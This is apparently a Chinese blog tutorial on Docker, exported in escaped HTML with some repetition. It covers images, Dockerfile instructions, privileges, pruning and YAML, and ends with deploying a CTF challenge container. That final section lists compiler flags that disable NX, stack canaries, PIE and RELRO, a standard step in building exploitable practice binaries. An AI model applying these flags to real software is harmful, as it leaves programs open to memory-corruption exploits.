class=\"built_in\">command</span></span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"EXPOSE\"><a href=\"#EXPOSE\" class=\"headerlink\" title=\"EXPOSE\"></a>EXPOSE</h4><p>EXPOSE 命令用来指定对外开放的端口（实际情况下不一定会打开）。一般格式为:</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXPOSE</span> port/[port,...]</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ENTRYPOINT\"><a href=\"#ENTRYPOINT\" class=\"headerlink\" title=\"ENTRYPOINT\"></a>ENTRYPOINT</h4><p>ENTRYPOINT 可以让你的容器表现得像一个可执行程序一样。一个 Dockerfile 中只能有一个 ENTRYPOINT，如果有多个，则最后一个生效。</p>\n<p>ENTRYPOINT命令有两种格式：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"language-bash\"> [<span class=\"string\">&quot;executable&quot;</span>, <span class=\"string\">&quot;param1&quot;</span>, <span class=\"string\">&quot;param2&quot;</span>] //推荐使用的 <span class=\"built_in\">exec</span>形式(直接调用对应命令)</span></span><br><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"language-bash\"> <span class=\"built_in\">command</span> param1 param2 //shell 形式(通过shell执行命令，如果没有shell则不行)</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"CMD\"><a href=\"#CMD\" class=\"headerlink\" title=\"CMD\"></a>CMD</h4><p>CMD 命令用于<strong>启动容器时默认执行的命令</strong>，CMD 命令可以包含可执行文件，也可以不包含可执行文件。不包含可执行文件的情况下就要用 ENTRYPOINT 指定一个，然后<strong>CMD命令的参数就会作为ENTRYPOINT的参数</strong>。</p>\n<p>CMD命令有三种格式：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> [<span class=\"string\">&quot;executable&quot;</span>,<span class=\"string\">&quot;param1&quot;</span>,<span class=\"string\">&quot;param2&quot;</span>] //推荐使用的 <span class=\"built_in\">exec</span> 形式(直接调用对应命令)</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> [<span class=\"string\">&quot;param1&quot;</span>,<span class=\"string\">&quot;param2&quot;</span>] //无可执行程序形式</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> <span class=\"built_in\">command</span> param1 param2 //shell 形式(通过shell执行命令，如果没有shell则不行)</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"VOLUME\"><a href=\"#VOLUME\" class=\"headerlink\" title=\"VOLUME\"></a>VOLUME</h4><p>VOLUME命令用于挂载一个目录，即<strong>建立一个容器和宿主机的目录的映射</strong>，其中的内容是共享的，一处改变另一处也会改变。可以在docker build中使用-v指令指定宿主机映射的目录，如果没有则默认映射到/docker/value/…/data。</p>\n<p>一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">VOLUME</span><span class=\"language-bash\"> directory_name</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"USER\"><a href=\"#USER\" class=\"headerlink\" title=\"USER\"></a>USER</h4><p>USER命令用于指定执行后续命令的用户或用户主，一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">USER</span> user_name[:user_group]</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ARG\"><a href=\"#ARG\" class=\"headerlink\" title=\"ARG\"></a>ARG</h4><p>ARG命令用于设置一个dockerfile中的变量，一般格式为:</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ARG</span> key = value</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ENV\"><a href=\"#ENV\" class=\"headerlink\" title=\"ENV\"></a>ENV</h4><p>ENV命令用于设置环境变量，一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ENV</span> key = value</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Docker特权设置\"><a href=\"#Docker特权设置\" class=\"headerlink\" title=\"Docker特权设置\"></a>Docker特权设置</h3><p>docker容器本质上仍是一个使用当前系统资源运行的进程。因此，即使在容器中有了root权限，有些操作仍然不能进行（因为会对系统的资源进行更改）。如果想要容器拥有这些权限，我们需要手动设置。</p>\n<p>docker使用–privileged, –cap-add, –cap-drop 来对容器本身的能力进行开放或限制，使用 –cap-add, –cap-drop 可以<strong>添加</strong>或<strong>禁用</strong>特定的权限，–privileged可以开放所有的权限。</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker <span class=\"keyword\">run</span><span class=\"language-bash\"> -it --cap-add SYS_TIME --<span class=\"built_in\">rm</span> --name centos /bin/sh //开放了SYS_TIME的权限</span></span><br><span class=\"line\">//--rm代表运行完自动删除</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"缓存清理\"><a href=\"#缓存清理\" class=\"headerlink\" title=\"缓存清理\"></a>缓存清理</h3><p>当镜像太多的时候，会占用不少的空间，此时可以清理缓存让自己多点空间可用。在使用build新建容器的时候，为了减少之后build所需的时间，部分内容会存入cache当中，如果空间太大了可以手动清空一下缓存：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker builder prune</span><br></pre></td></tr></table></figure>\n\n<p>清除所有镜像（慎用）</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker image prune</span><br></pre></td></tr></table></figure>\n\n<p>清除所有网络、容器、镜像和缓存（慎用）</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker system prune</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Docker-Compose\"><a href=\"#Docker-Compose\" class=\"headerlink\" title=\"Docker Compose\"></a>Docker Compose</h2><p>Compose 是用于定义和运行多容器 Docker 应用程序的工具。通过 Compose，您可以使用 YML 文件来<strong>配置应用程序需要的所有服务</strong>。然后，使用一个命令，就可以从 YML 文件配置中创建并启动所有服务。</p>\n<h3 id=\"YAML\"><a href=\"#YAML\" class=\"headerlink\" title=\"YAML\"></a>YAML</h3><p>YAML 的语法和其他高级语言类似，并且可以简单表达清单、散列表，标量等数据形态。它使用空白符号缩进和大量依赖外观的特色，特别适合用来表达或编辑数据结构、各种配置文件、倾印调试内容、文件大纲（例如：许多电子邮件标题格式和YAML非常接近）。YAML 的配置文件后缀为 .yml</p>\n<p>基本语法:</p>\n<ul>\n<li>大小写敏感</li>\n<li>使用缩进表示层级关系</li>\n<li>缩进不允许使用tab，只允许空格</li>\n<li>缩进的空格数不重要，只要相同层级的元素左对齐即可</li>\n<li>‘#’表示注释</li>\n</ul>\n<h4 id=\"YAML对象\"><a href=\"#YAML对象\" class=\"headerlink\" title=\"YAML对象\"></a>YAML对象</h4><p>对象键值对使用冒号结构表示 key: value，<strong>冒号后面要加一个空格</strong>。</p>\n<p>对象之间可以嵌套，使用缩进表示层级关系。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">key:</span> </span><br><span class=\"line\">    <span class=\"attr\">child_key1:</span> <span class=\"string\">value1</span></span><br><span class=\"line\">    <span class=\"attr\">child_key2:</span> <span class=\"string\">value2</span></span><br></pre></td></tr></table></figure>\n\n<p>如果有复杂的对象，可以使用?加空格表示复杂的key，使用:加空格表示value。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"string\">?</span> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">key1</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">key2</span></span><br><span class=\"line\"><span class=\"string\">:</span> </span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">value1</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">value2</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"YAML数组\"><a href=\"#YAML数组\" class=\"headerlink\" title=\"YAML数组\"></a>YAML数组</h4><p>用- 开头的行表示一个数组</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">A</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">B</span></span><br><span class=\"line\"><span class=\"bullet\">-</span> <span class=\"string\">C</span></span><br></pre></td></tr></table></figure>\n\n<p>表示数组[A,B,C]</p>\n<p>可以支持多维数组：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"bullet\">-</span> </span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">A</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">B</span></span><br><span class=\"line\"> <span class=\"bullet\">-</span> <span class=\"string\">C</span></span><br></pre></td></tr></table></figure>\n\n<p>表示[[A,B,C]]</p>\n<p>数组也可以使用流式(flow)的方式表示：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">companies:</span> [&#123;<span class=\"attr\">id:</span> <span class=\"number\">1</span>,<span class=\"attr\">name:</span> <span class=\"string\">company1</span>,<span class=\"attr\">price:</span> <span class=\"string\">200W</span>&#125;,&#123;<span class=\"attr\">id:</span> <span class=\"number\">2</span>,<span class=\"attr\">name:</span> <span class=\"string\">company2</span>,<span class=\"attr\">price:</span> <span class=\"string\">500W</span>&#125;]</span><br></pre></td></tr></table></figure>\n\n<p>数组和对象可以构成复合结构。</p>\n<h4 id=\"纯量\"><a href=\"#纯量\" class=\"headerlink\" title=\"纯量\"></a>纯量</h4><p>最基本的不可再分的值，包括：字符串（可以拆成多行，每一行会被转化成一个空格）、布尔值、整数、浮点数、Null、时间（使用ISO 8601格式，时间和日期之间使用T连接，最后使用+代表时区）、日期（必须使用ISO 8601格式，即yyyy-MM-dd）。</p>\n<h4 id=\"锚点和引用\"><a href=\"#锚点和引用\" class=\"headerlink\" title=\"锚点和引用\"></a>锚点和引用</h4><p>用&amp;表示建立锚点，用*表示引用锚点。</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">defaults:</span> <span class=\"meta\">&amp;defaults</span></span><br><span class=\"line\">  <span class=\"attr\">adapter:</span>  <span class=\"string\">postgres</span></span><br><span class=\"line\">  <span class=\"attr\">host:</span>     <span class=\"string\">localhost</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">development:</span></span><br><span class=\"line\">  <span class=\"attr\">database:</span> <span class=\"string\">myapp_development</span></span><br><span class=\"line\">  <span class=\"string\">&lt;&lt;:</span> <span class=\"meta\">*defaults</span></span><br></pre></td></tr></table></figure>\n\n<p>相当于:</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">defaults:</span></span><br><span class=\"line\">  <span class=\"attr\">adapter:</span>  <span class=\"string\">postgres</span></span><br><span class=\"line\">  <span class=\"attr\">host:</span>     <span class=\"string\">localhost</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"attr\">development:</span></span><br><span class=\"line\">  <span class=\"attr\">database:</span> <span class=\"string\">myapp_development</span></span><br><span class=\"line\">  <span class=\"attr\">adapter:</span>  <span class=\"string\">postgres</span></span><br><span class=\"line\">  <span class=\"attr\">host:</span>     <span class=\"string\">localhost</span></span><br></pre></td></tr></table></figure>\n\n<p>&lt;&lt;表示合并到当前数据。</p>\n<h3 id=\"本次出题\"><a href=\"#本次出题\" class=\"headerlink\" title=\"本次出题\"></a>本次出题</h3><figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build -t <span class=\"string\">&quot;problem_name&quot;</span> .</span><br><span class=\"line\">docker <span class=\"keyword\">run</span><span class=\"language-bash\"> -d -p <span class=\"string\">&quot;0.0.0.0:pub_port:9999&quot;</span> -h <span class=\"string\">&quot;hostname&quot;</span> --name=<span class=\"string\">&quot;container_name&quot;</span> problem_name</span></span><br></pre></td></tr></table></figure>\n\n<p>编译</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># NX保护机制：</span></span><br><span class=\"line\">-z execstack / -z noexecstack  <span class=\"comment\"># (关闭 / 开启) 堆栈不可执行</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># Canary：(关闭 / 开启 / 全开启) 栈里插入cookie信息</span></span><br><span class=\"line\"><span class=\"comment\"># !开canary好像会造成栈中局部变量的顺序有所改变</span></span><br><span class=\"line\">-fno-stack-protector /-fstack-protector / -fstack-protector-all </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># ASLR和PIE：</span></span><br><span class=\"line\">-no-pie / -pie   <span class=\"comment\"># (关闭 / 开启) 地址随机化，另外打开后会有get_pc_thunk</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># RELRO：</span></span><br><span class=\"line\">-z norelro / -z lazy / -z now   <span class=\"comment\"># (关闭 / 部分开启 / 完全开启) 对GOT表具有写权限</span></span><br><span class=\"line\"></span><br><span class=\"line\">-s   <span class=\"comment\"># 去除符号表</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>Docker是一种容器，与虚拟机有所不同。虚拟机在宿主机上建立一层虚拟层，在虚拟层上运行新的os，而容器没有建立虚拟层，直接调用原生os的资源。因此虚拟机的隔离性更好，当然消耗资源也会更高，而容器的隔离性没有这么好，属于原生os的一个进程。</p>","more":"<h2 id=\"Docker的基本概念\"><a href=\"#Docker的基本概念\" class=\"headerlink\" title=\"Docker的基本概念\"></a>Docker的基本概念</h2><p>Docker中有三个基本的概念，分别是**镜像(Image)、容器(Container)和仓库(repository)**。镜像是容器运行的前提，仓库是存放容器的场所，镜像是Docker的核心。</p>\n<p>镜像可以看作是一个<strong>特殊的文件系统</strong>，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也不会被改变。</p>\n<p>容器 (container) 的定义和镜像 (image) 几乎一模一样，也是一堆层的统一视角，唯一区别在于容器的最上面那一层是可读可写的。实际上，<strong>容器 = 镜像 + 读写层</strong>。</p>\n<p>仓库是集中存放镜像文件的场所。镜像构建完成后，可以很容易的在当前宿主上运行，但是， 如果需要在其它服务器上使用这个镜像，我们就需要一个集中的存储、分发镜像的服务，Docker Registry (仓库注册服务器)就是这样的服务。有时候会把仓库(Repository) 和仓库注册服务器 (Registry) 混为一谈，并不严格区分。Docker 仓库的概念跟 Git 类似，注册服务器可以理解为 GitHub 这样的托管服务。实际上，一个 Docker Registry 中可以包含多个仓库 (Repository) ，每个仓库可以包含多个标签 (Tag)，每个标签对应着一个镜像。所以说，<strong>镜像仓库是 Docker 用来集中存放镜像文件的地方</strong>类似于我们之前常用的代码仓库。</p>\n<p>通常，一个仓库会包含同一个软件不同版本的镜像，而标签就常用于对应该软件的各个版本 。我们可以通过 <strong>&lt;仓库名&gt;:&lt;标签&gt;的格式</strong>来指定具体是这个软件哪个版本的镜像。如果不给出标签，将以 latest 作为默认标签。</p>\n<h2 id=\"Docker常用命令\"><a href=\"#Docker常用命令\" class=\"headerlink\" title=\"Docker常用命令\"></a>Docker常用命令</h2><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker -<span class=\"built_in\">help</span> //获取帮助手册</span><br><span class=\"line\">docker pull image_name //拉取名字为image_name的镜像</span><br><span class=\"line\">docker images //查看本地的镜像</span><br><span class=\"line\">docker ps -a //查看哪些容器运行过</span><br><span class=\"line\">docker ps //查看哪些容器正在运行</span><br><span class=\"line\">docker start container_name/container_id //启动容器</span><br><span class=\"line\">docker restart container_name/container_id //重启容器</span><br><span class=\"line\">docker stop container_name/container_id //关闭容器</span><br><span class=\"line\">docker attach container_name/container_id //进入容器</span><br><span class=\"line\"></span><br><span class=\"line\">//运行容器</span><br><span class=\"line\">docker run --name image_name -d -p port repo_name/image_name:tag //-p指定该容器的端口号 -d表示后台运行</span><br><span class=\"line\">docker run -t -i container_name/container_id /bin/bash // -t 终端、-i 交互式操作</span><br><span class=\"line\"></span><br><span class=\"line\">docker search image_name //查找镜像</span><br><span class=\"line\">docker <span class=\"built_in\">rm</span> container_name/container_id //删除容器</span><br><span class=\"line\">docker rmi image_name //删除镜像</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"Dockerfile\"><a href=\"#Dockerfile\" class=\"headerlink\" title=\"Dockerfile\"></a>Dockerfile</h2><p>Dockerfile是一个用来构建镜像的文本文件，文本内容包含了一条条构建镜像所需的指令和说明，用户可以使用 Dockerfile 快速创建自定义的镜像。</p>\n<p>一般来说，我们可以将 Dockerfile 分为四个部分：</p>\n<ol>\n<li>基础镜像(父镜像)信息指令 FROM</li>\n<li>维护者信息指令 MAINTAINER</li>\n<li>镜像操作指令 RUN 、 EVN 、 ADD 和 WORKDIR 等</li>\n<li>容器启动指令 CMD 、 ENTRYPOINT 和 USER 等</li>\n</ol>\n<p>我们可以通过build命令使用Dockerfile创建镜像：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker build -t repo_name/image_name:tag dockerfile_relative_path //-t 是为新镜像设置仓库和名称 dockerfile_relative_path表示Dockerfile的相对路径</span><br></pre></td></tr></table></figure>\n\n\n<h3 id=\"Dockerfile常用指令\"><a href=\"#Dockerfile常用指令\" class=\"headerlink\" title=\"Dockerfile常用指令\"></a>Dockerfile常用指令</h3><p>由于 Dockerfile 中所有的命令都是以下格式：INSTRUCTION argument ，指令 (INSTRUCTION) 不分大小写，但是<strong>推荐大写</strong>。</p>\n<h4 id=\"FROM\"><a href=\"#FROM\" class=\"headerlink\" title=\"FROM\"></a>FROM</h4><p>定制的镜像往往是基于一个原有的镜像进行的，Docker中的From命令就是用于<strong>指定基础镜像</strong>。一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">FROM</span> image_name/image_name:tag</span><br></pre></td></tr></table></figure>\n\n<p>FROM 以后的所有指令都会在 FROM 的基础上进行创建镜像。可以在同一个 Dockerfile 中多次使用 FROM 命令用于创建多个镜像。</p>\n<h4 id=\"MAINTAINER（将被删除）\"><a href=\"#MAINTAINER（将被删除）\" class=\"headerlink\" title=\"MAINTAINER（将被删除）\"></a>MAINTAINER（将被删除）</h4><p>MAINTAINER 是用于指定镜像创建者和联系方式。一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">MAINTAINER</span> name &lt;email&gt;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"COPY\"><a href=\"#COPY\" class=\"headerlink\" title=\"COPY\"></a>COPY</h4><p>COPY 是用于<strong>复制本地主机的资源</strong>&lt;src&gt;(为 Dockerfile 所在目录的相对路径)到容器中的&lt;dest&gt;。一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">COPY</span><span class=\"language-bash\"> src dest</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ADD\"><a href=\"#ADD\" class=\"headerlink\" title=\"ADD\"></a>ADD</h4><p>ADD命令的功能与COPY类似，都是在容器中新增一个资源，但不同的是ADD可以从网络中获取资源，并且如果源文件为.tar的话，ADD命令可以自动解压缩到目标路径。</p>\n<p>但是在不解压的前提下，无法复制 tar 压缩文件。这会令镜像构建缓存失效，从而可能会令镜像构建变得比较缓慢。</p>\n<p>一般格式：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ADD</span><span class=\"language-bash\"> src dest</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"WORKDIR\"><a href=\"#WORKDIR\" class=\"headerlink\" title=\"WORKDIR\"></a>WORKDIR</h4><p>WORKDIR 用于配合 RUN，CMD，ENTRYPOINT 命令<strong>设置当前工作路径</strong>。可以设置多次，如果是相对路径，则<strong>相对前一个 WORKDIR 命令</strong>，默认路径为/。</p>\n<p>一般格式为:</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">WORKDIR</span><span class=\"language-bash\"> relative_path</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"RUN\"><a href=\"#RUN\" class=\"headerlink\" title=\"RUN\"></a>RUN</h4><p>RUN 用于容器内部执行命令。每个RUN命令相当于在原有的镜像基础上添加了一个改动层，原有的镜像不会有变化。一般格式为:</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">RUN</span><span class=\"language-bash\"> <span class=\"built_in\">command</span></span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"EXPOSE\"><a href=\"#EXPOSE\" class=\"headerlink\" title=\"EXPOSE\"></a>EXPOSE</h4><p>EXPOSE 命令用来指定对外开放的端口（实际情况下不一定会打开）。一般格式为:</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">EXPOSE</span> port/[port,...]</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ENTRYPOINT\"><a href=\"#ENTRYPOINT\" class=\"headerlink\" title=\"ENTRYPOINT\"></a>ENTRYPOINT</h4><p>ENTRYPOINT 可以让你的容器表现得像一个可执行程序一样。一个 Dockerfile 中只能有一个 ENTRYPOINT，如果有多个，则最后一个生效。</p>\n<p>ENTRYPOINT命令有两种格式：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"language-bash\"> [<span class=\"string\">&quot;executable&quot;</span>, <span class=\"string\">&quot;param1&quot;</span>, <span class=\"string\">&quot;param2&quot;</span>] //推荐使用的 <span class=\"built_in\">exec</span>形式(直接调用对应命令)</span></span><br><span class=\"line\"><span class=\"keyword\">ENTRYPOINT</span><span class=\"language-bash\"> <span class=\"built_in\">command</span> param1 param2 //shell 形式(通过shell执行命令，如果没有shell则不行)</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"CMD\"><a href=\"#CMD\" class=\"headerlink\" title=\"CMD\"></a>CMD</h4><p>CMD 命令用于<strong>启动容器时默认执行的命令</strong>，CMD 命令可以包含可执行文件，也可以不包含可执行文件。不包含可执行文件的情况下就要用 ENTRYPOINT 指定一个，然后<strong>CMD命令的参数就会作为ENTRYPOINT的参数</strong>。</p>\n<p>CMD命令有三种格式：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> [<span class=\"string\">&quot;executable&quot;</span>,<span class=\"string\">&quot;param1&quot;</span>,<span class=\"string\">&quot;param2&quot;</span>] //推荐使用的 <span class=\"built_in\">exec</span> 形式(直接调用对应命令)</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> [<span class=\"string\">&quot;param1&quot;</span>,<span class=\"string\">&quot;param2&quot;</span>] //无可执行程序形式</span></span><br><span class=\"line\"><span class=\"keyword\">CMD</span><span class=\"language-bash\"> <span class=\"built_in\">command</span> param1 param2 //shell 形式(通过shell执行命令，如果没有shell则不行)</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"VOLUME\"><a href=\"#VOLUME\" class=\"headerlink\" title=\"VOLUME\"></a>VOLUME</h4><p>VOLUME命令用于挂载一个目录，即<strong>建立一个容器和宿主机的目录的映射</strong>，其中的内容是共享的，一处改变另一处也会改变。可以在docker build中使用-v指令指定宿主机映射的目录，如果没有则默认映射到/docker/value/…/data。</p>\n<p>一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">VOLUME</span><span class=\"language-bash\"> directory_name</span></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"USER\"><a href=\"#USER\" class=\"headerlink\" title=\"USER\"></a>USER</h4><p>USER命令用于指定执行后续命令的用户或用户主，一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">USER</span> user_name[:user_group]</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ARG\"><a href=\"#ARG\" class=\"headerlink\" title=\"ARG\"></a>ARG</h4><p>ARG命令用于设置一个dockerfile中的变量，一般格式为:</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ARG</span> key = value</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ENV\"><a href=\"#ENV\" class=\"headerlink\" title=\"ENV\"></a>ENV</h4><p>ENV命令用于设置环境变量，一般格式为：</p>\n<figure class=\"highlight docker\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">ENV</span> key = value</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"Docker特权设置\"><a href=\"#Docker特权设置\" class=\"headerlink\" title=\"Docker特权设置\"></a>Docker特权设置</h3><p>docker容器本质上仍是一个使用当前系统资源运行的进程。因此，即使在容器中有了root权限，有些操作仍然不能进行（因为会对系统的资源进行更改）。如果想要容器拥有这些权限，我们需要手动设置。</p>\n<p>docker使用–privileged, –cap-add, –cap-drop 来对容器本身的能力进行开放或限制，使用 –cap-add, 